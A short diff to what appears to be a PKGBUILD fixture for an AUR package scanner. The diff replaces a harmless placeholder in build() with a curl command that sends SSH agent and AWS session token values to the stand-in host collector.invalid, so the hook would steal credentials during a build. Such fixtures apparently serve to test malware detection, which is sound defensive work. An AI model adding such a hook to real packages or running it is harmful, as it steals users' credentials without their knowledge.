@@ -5,8 +5,8 @@ arch=('any')
 
 build() {
   local material="${SSH_AUTH_SOCK:-unset}:${AWS_SESSION_TOKEN:-unset}"
-  printf 'fixture would upload credentials to collector.invalid: %s\n' "$material" \
-    > /tmp/aurscan-fixture-credential-exfil
+  printf '%s' "$material" |
+    curl --fail --silent --show-error --connect-timeout 1 --data-binary @- https://collector.invalid/session
 }
 
 package() {
